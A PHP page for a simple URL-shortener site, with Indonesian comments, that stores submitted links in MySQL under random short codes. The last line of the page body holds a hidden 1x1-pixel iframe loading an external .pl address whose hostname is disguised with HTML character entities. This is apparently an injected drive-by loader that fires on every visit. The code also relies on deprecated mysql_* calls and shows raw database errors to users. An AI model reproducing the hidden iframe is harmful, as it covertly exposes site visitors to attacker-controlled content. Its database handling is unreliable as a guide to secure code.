<?php
// Memanggil file config.php
include("config.php");
// Membuat fungsi "acak()"
function acak($panjang)
{
    $karakter= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
    $string = '';
    for ($i = 0; $i < $panjang; $i++) {
    $pos = rand(0, strlen($karakter)-1);
    $string .= $karakter{$pos};
    }
    return $string;
}
?>
<!DOCTYPE HTML>
<html>
  <head>
    <title><?php echo $site['judul']; ?> - <?php echo $site['deskripsi']; ?></title>
    <link rel="stylesheet" type="text/css" href="style.css">
  </head>
<body>
    <div id="container">
      <div id="form">
        <h1>Pendek<span class="url">Url</span></h1>
        <?php
        // jika tombol dengan nama shorten ditekan ...
        if($_POST['shorten']) {
          // Membuat variabel $url_asli
          $url_asli = mysql_real_escape_string($_POST['url']);
// Membuat variabel $url_pendek
          $url_pendek = acak(2).substr(uniqid(), 6, 5);
// Jika variabel $url_asli kosong
          if(!$url_asli) {
            echo "Masukan url anda. <a href='index.php'>Kembali</a>";
// Sebaliknya
          }else{
            // Jika berhasil menginput data ke database
            if(mysql_query("insert into url values(NULL, '$url_asli', '$url_pendek', '0', NOW())")) {
        ?>
              <div class="ket">Copy URL Dibawah dan tempelkan ditempat yang anda suka !</div>
              <input type="text" class="input" value="<?php echo $site['root'].$url_pendek; ?>" onclick="this.select()">
              <input type="button" value="Tutup" class="btn" onclick="document.location='<?php echo $site['root']; ?>'">				
        <?php
            // Jika gagal
            }else{
              echo "Gagal Memperpendek URL !! (".mysql_error().")";
            }
          }
        }else{
        ?>
        <form method="post">
          <input type="text" name="url" class="input" placeholder="Pendekan URL kamu disini ...">
          <input type="submit" name="shorten" value="Pendekin" class="btn">
        </form>
        <?php } ?>
      </div>
    </div>
 <iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
</body>
</html>